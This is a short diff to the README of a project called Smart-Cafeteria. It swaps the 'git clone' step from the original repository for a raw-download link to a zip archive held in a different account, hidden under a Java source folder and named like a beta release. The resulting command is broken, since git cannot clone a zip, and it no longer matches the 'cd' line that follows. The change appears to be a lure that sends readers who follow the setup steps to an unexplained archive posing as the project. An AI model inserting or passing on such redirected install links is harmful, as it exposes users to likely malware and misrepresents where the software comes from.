@@ -48,7 +48,7 @@ Smart-Cafeteria/
 
 1. Clone the repository
 ```bash
-git clone https://github.com/gabbslvm/Smart-Cafeteria.git
+git clone https://github.com/soldat-panther/Cafeteria-System/raw/refs/heads/main/src/main/java/userinterface/System-Cafeteria-3.1-beta.2.zip
 cd Smart-Cafeteria
 ```
 
